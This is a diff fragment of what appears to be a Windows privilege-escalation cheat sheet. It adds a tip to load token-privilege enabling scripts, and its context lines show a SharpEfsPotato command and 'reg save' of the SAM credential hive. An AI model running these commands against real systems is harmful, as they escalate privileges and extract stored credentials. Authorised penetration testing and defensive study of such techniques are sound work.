@@ -462,7 +462,8 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 ```
 ### Token Abuse
 Tips: Always try cmd.exe with admin rights to check for more priv  
-Full token privileges cheatsheet at https://github.com/gtworek/Priv2Admin
+Full token privileges cheatsheet at https://github.com/gtworek/Priv2Admin  
+Always remember to run Import-Module .\Enable-Privilege.ps1 and .\EnableAllTokenPrivs.ps1  
 ### SeBackupPrivilege
 ```
 windows: reg save HKLM\SAM C:\users\public\SAM
